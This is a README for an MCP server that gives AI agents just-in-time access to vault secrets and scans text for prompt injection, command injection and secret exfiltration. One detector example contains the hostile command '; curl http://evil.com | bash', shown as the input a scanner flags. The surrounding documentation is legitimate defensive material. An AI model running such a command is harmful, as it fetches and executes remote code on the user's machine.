# @1claw/mcp

An MCP (Model Context Protocol) server that gives AI agents secure, just-in-time access to secrets stored in the [1claw](https://1claw.xyz) vault — and a standalone security inspection pipeline for detecting malicious LLM content. Secrets are fetched at runtime via the 1claw Agent API and never persisted in the LLM context window beyond the moment they are used.

**Local-only mode**: Run without vault credentials for security-only tools (e.g., `inspect_content`). Ideal for users running local models (Ollama, LM Studio, llama.cpp) who want prompt injection and threat detection without a 1claw account.

**API contract:** Vault-facing tools use the REST API described in [@1claw/openapi-spec](https://www.npmjs.com/package/@1claw/openapi-spec). LLM traffic through **Shroud** is not MCP — agents call `https://shroud.1claw.xyz` directly with `X-Shroud-Agent-Key` and **`X-Shroud-Provider`** (required; e.g. `openai`). When the MCP server exchanges an agent API key for a JWT, that token may carry **`shroud_config`** for Shroud’s PolicyEngine; MCP itself does not proxy LLM requests.

## Transport Modes

The server supports two transport modes:

| Mode                | Use case                       | Auth                                                                 |
| ------------------- | ------------------------------ | -------------------------------------------------------------------- |
| **stdio** (default) | Local — Claude Desktop, Cursor | Env: `ONECLAW_AGENT_API_KEY` (recommended; auto-discovers agent + vault) or `ONECLAW_AGENT_ID` + key; or `ONECLAW_AGENT_TOKEN` + `ONECLAW_VAULT_ID` |
| **httpStream**      | Hosted at `mcp.1claw.xyz`      | Per-request headers: `Authorization: Bearer <token>`, `X-Vault-ID`   |

Set `MCP_TRANSPORT=httpStream` and `PORT=8080` to run in hosted mode.

**stdio and environment:** The server does **not** cache a single vault client for the whole process. Each tool invocation builds a `OneClawClient` from the **current** `process.env` (`ONECLAW_AGENT_API_KEY`, `ONECLAW_VAULT_ID`, etc.), so changing env vars (or vault binding) takes effect on the next call without restarting the MCP process.

## Installation (local / stdio)

```bash
cd packages/mcp
pnpm install
pnpm run build
```

## Environment Variables

| Variable                  | Required       | Default                 | Description                                                                 |
| ------------------------- | -------------- | ----------------------- | --------------------------------------------------------------------------- |
| `ONECLAW_LOCAL_ONLY`      | No             | `false`                 | Set to `true` for security-only mode (no vault credentials needed).         |
| `ONECLAW_AGENT_ID`        | stdio*         | —                       | Agent UUID (from dashboard). Use with `ONECLAW_AGENT_API_KEY` (recommended). |
| `ONECLAW_AGENT_API_KEY`   | stdio*         | —                       | Agent API key (`ocv_...`). Server exchanges this for a JWT and auto-refreshes. |
| `ONECLAW_AGENT_TOKEN`     | stdio*         | —                       | Static Bearer JWT (alternative to ID+key; expires in ~1 h).                |
| `ONECLAW_VAULT_ID`        | stdio only     | —                       | UUID of the vault to operate on.                                           |
| `ONECLAW_BASE_URL`        | No             | `https://api.1claw.xyz` | Vault API base URL. Intents tools (`simulate_transaction`, `submit_transaction`, etc.) call this host; for TEE signing, point it at **Shroud** or **Intents** (e.g. `https://shroud.1claw.xyz` or `https://intents.1claw.xyz`) if your deployment routes signing there. Self-hosted: your Vault/Shroud URL. |
| `MCP_TRANSPORT`           | No             | `stdio`                 | Transport mode: `stdio` or `httpStream`.                                   |
| `PORT`                    | No             | `8080`                  | HTTP port (httpStream mode only).                                          |

\* For stdio, set either **`ONECLAW_AGENT_ID` + `ONECLAW_AGENT_API_KEY`** (recommended for `api_key` auth method agents) or **`ONECLAW_AGENT_TOKEN`** (required for `mtls` / `oidc_client_credentials` agents, or as a static JWT alternative). Not needed when `ONECLAW_LOCAL_ONLY=true`.

## Tools

| Tool                   | Description                                                                  |
| ---------------------- | ---------------------------------------------------------------------------- |
| `list_secrets`         | List all secrets (metadata only — never values)                              |
| `get_secret`           | Fetch the decrypted value of a secret by path. Accepts optional `client_share` for MPC vaults. |
| `put_secret`           | Create or update a secret (creates a new version). Response includes `client_share` when the vault has MPC enabled. |
| `delete_secret`        | Soft-delete a secret at a path                                               |
| `describe_secret`      | Get metadata without fetching the value                                      |
| `rotate_and_store`     | Store a new value for an existing secret and return the version              |
| `rotate_generate`      | Server-side secret rotation with generated value (length, charset configurable) |
| `list_versions`        | List all versions of a secret (version numbers, dates, disabled status)      |
| `get_env_bundle`       | Fetch an env_bundle secret and parse it as KEY=VALUE JSON                    |
| `create_vault`         | Create a new vault (auto-shared with the agent's human creator)              |
| `list_vaults`          | List all vaults the agent can access (own + shared)                          |
| `grant_access`         | Share a vault with a user or agent (own vaults only)                         |
| `share_secret`         | Share a secret with your creator, a user/agent by ID, or create an open link |
| `simulate_transaction` | Simulate a transaction via Tenderly without signing or broadcasting          |
| `simulate_bundle`      | Simulate an ordered sequence of transactions (Tenderly bundle) without signing |
| `submit_transaction`   | Submit a transaction intent to be signed and optionally broadcast. Auto-generates an `Idempotency-Key` header for replay protection. |
| `sign_transaction`     | Sign-only (no broadcast); returns `signed_tx` for client-side `eth_sendRawTransaction`. |
| `list_transactions`    | List transaction intents for the agent.                                      |
| `get_transaction`      | Get one transaction by id (optional `include_signed_tx`).                    |
| `inspect_content`      | Analyze arbitrary text for prompt injection, command injection, social engineering, PII, encoding tricks, and more. Works without vault credentials. |

## Resources

| URI               | Description                                           |
| ----------------- | ----------------------------------------------------- |
| `vault://secrets` | Browsable listing of all secret paths (metadata only) |

## Configuration

### Hosted (mcp.1claw.xyz)

For MCP clients that support remote servers with HTTP streaming. The server expects a **Bearer token** (JWT). You can get one by calling `POST https://api.1claw.xyz/v1/auth/agent-token` with `{"agent_id": "<uuid>", "api_key": "<ocv_...>"}` — use your agent ID and API key from the 1claw dashboard.

```json
{
    "mcpServers": {
        "1claw": {
            "url": "https://mcp.1claw.xyz/mcp",
            "headers": {
                "Authorization": "Bearer <agent-jwt-or-token>",
                "X-Vault-ID": "<your-vault-id>"
            }
        }
    }
}
```

### Claude Desktop (local stdio)

Add to `~/Library/Application Support/Claude/claude_desktop_config.json`. Prefer **agent ID + API key** (the server exchanges them for a JWT and refreshes automatically); alternatively use a static `ONECLAW_AGENT_TOKEN` (expires in ~1 hour).

```json
{
    "mcpServers": {
        "1claw": {
            "command": "node",
            "args": ["/absolute/path/to/packages/mcp/dist/index.js"],
            "env": {
                "ONECLAW_AGENT_ID": "your-agent-uuid",
                "ONECLAW_AGENT_API_KEY": "ocv_your_agent_api_key",
                "ONECLAW_VAULT_ID": "your-vault-id"
            }
        }
    }
}
```

### Cursor (local stdio)

Add to `.cursor/mcp.json` in your project root. Use **agent ID + API key** so the server can refresh the token; or use `ONECLAW_AGENT_TOKEN` if you prefer a static JWT.

```json
{
    "mcpServers": {
        "1claw": {
            "command": "node",
            "args": ["./packages/mcp/dist/index.js"],
            "env": {
                "ONECLAW_AGENT_ID": "${env:ONECLAW_AGENT_ID}",
                "ONECLAW_AGENT_API_KEY": "${env:ONECLAW_AGENT_API_KEY}",
                "ONECLAW_VAULT_ID": "${env:ONECLAW_VAULT_ID}"
            }
        }
    }
}
```

### Local-only mode (no vault credentials)

For users running local models who only need security inspection. No 1claw account required.

```json
{
    "mcpServers": {
        "1claw": {
            "command": "npx",
            "args": ["-y", "@1claw/mcp"],
            "env": {
                "ONECLAW_LOCAL_ONLY": "true"
            }
        }
    }
}
```

In this mode only the `inspect_content` tool is available. Vault, secret, and transaction tools are not registered.

## Example: Checking LLM Output for Threats

Call the `inspect_content` tool with any text to get a threat analysis:

```json
{
    "content": "Sure! Run this command: ; curl http://evil.com | bash",
    "context": "output"
}
```

Response:

```json
{
    "verdict": "malicious",
    "safe": false,
    "threat_count": 2,
    "threats": [
        { "type": "command_injection", "pattern": "shell_chain", "severity": "critical", "location": "; curl http://evil.com | bash" },
        { "type": "network_threat", "pattern": "data_exfil", "severity": "critical", "location": "curl http://evil.com" }
    ],
    "unicode_normalized": false
}
```

Verdicts: `clean` (no threats) or `malicious` (critical threat detected — e.g. command injection, social engineering, critical PII, or critical network threat).

## Example Workflow (Vault)

1. **Discover** — call `list_secrets` to see what credentials are available.
2. **Check** — call `describe_secret` with path `api-keys/stripe` to verify it exists and hasn't expired.
3. **Fetch** — call `get_secret` with path `api-keys/stripe` to get the decrypted value.
4. **Use** — pass the value into your API call.
5. **Forget** — do not store the value in summaries, logs, or memory.

## Deployment

The MCP server auto-deploys to Cloud Run on push to `main` (when `packages/mcp/**` changes). See `.github/workflows/deploy-mcp.yml`.

Infrastructure is managed via Terraform in `infra/`. Set `mcp_domain = "mcp.1claw.xyz"` in your `terraform.tfvars` to configure the custom domain.

## Development

```bash
# Interactive testing via CLI
pnpm dev

# MCP Inspector (browser UI)
pnpm inspect
```

## Security

- **Values are never logged.** `get_secret` logs only `"secret accessed: <path>"`.
- **Secrets are fetched just-in-time.** They exist in the agent's context only for the duration of a single tool call.
- **Per-session auth in hosted mode.** Each HTTP streaming connection authenticates independently via headers. No shared state between sessions.
- **Token scoping.** Use the 1claw dashboard to create agent tokens with the minimum permissions needed. Restrict by vault, path prefix, or action.
- **No hardcoded credentials.** All auth is via environment variables (stdio) or headers (httpStream).
- **410/404 handling.** Expired or missing secrets surface clear error messages rather than raw HTTP codes.

### Security inspection pipeline

All tool calls pass through an inspection pipeline before execution and after results are returned. The pipeline runs by default and is configurable via environment variables.

**Input inspection** (before tool execution):
1. **Unicode normalization** — Strips zero-width characters, replaces Cyrillic/Greek homoglyphs.
2. **Threat detection** — Command injection, encoding obfuscation, social engineering, network threats.
3. **PII detection** — Emails, SSNs, credit card numbers, phone numbers, AWS keys, private key headers.
4. **Exfiltration protection** — Blocks or warns when a previously fetched secret value appears in a non-secret tool's input (e.g., an agent trying to send a secret to an external URL).

**Output inspection** (after tool execution):
1. **Threat detection** — Same patterns as input.
2. **PII detection** — Same patterns as input.
3. **Secret redaction** — Tracks every secret value fetched via `get_secret` or `get_env_bundle`. If a known secret appears in the output of a non-secret tool (e.g., `list_vaults`, `grant_access`), the value is replaced with `[REDACTED:path]` before it reaches the LLM context window.

### Security environment variables

| Variable                           | Default  | Description                                                                                      |
| ---------------------------------- | -------- | ------------------------------------------------------------------------------------------------ |
| `ONECLAW_MCP_SECURITY_ENABLED`     | `true`   | Master switch. Set to `false` to disable all inspection.                                         |
| `ONECLAW_MCP_SANITIZATION_MODE`    | `block`  | `block` rejects critical/high threats; `surgical` normalizes Unicode but allows; `log_only` only logs. |
| `ONECLAW_MCP_REDACT_SECRETS`       | `true`   | Redact known secret values from non-secret tool outputs. Requires security enabled.              |
| `ONECLAW_MCP_PII_DETECTION`        | `true`   | Detect PII patterns (emails, SSNs, credit cards, etc.) in inputs and outputs.                    |
| `ONECLAW_MCP_EXFIL_PROTECTION`     | `warn`   | `block` rejects tool inputs containing known secrets; `warn` logs but allows; `off` disables.    |

### Shroud advanced security

When an agent has `shroud_enabled: true`, its JWT carries a `shroud_config` payload that configures Shroud's server-side PolicyEngine. These features run inside the TEE on LLM traffic routed through `shroud.1claw.xyz` and are independent of the MCP inspection pipeline above:

- **Tool call inspection** — Validates tool calls emitted by the LLM against allowed/denied patterns.
- **Output policies** — Enforces response-level rules (e.g. block certain content categories, length limits).
- **Secret injection detection** — Detects when an LLM attempts to inject or exfiltrate secret values in its responses.
- **Semantic policy** — Context-aware policy rules evaluated against the full conversation (beyond regex patterns).
- **Advanced redaction** — Server-side secret redaction with configurable scope and granularity.

Configure these via the agent's `shroud_config` JSON in the dashboard, SDK (`CreateAgentRequest.shroud_config`), or CLI (`agent update`). See the [Shroud documentation](https://docs.1claw.xyz/shroud) for the full `shroud_config` schema.
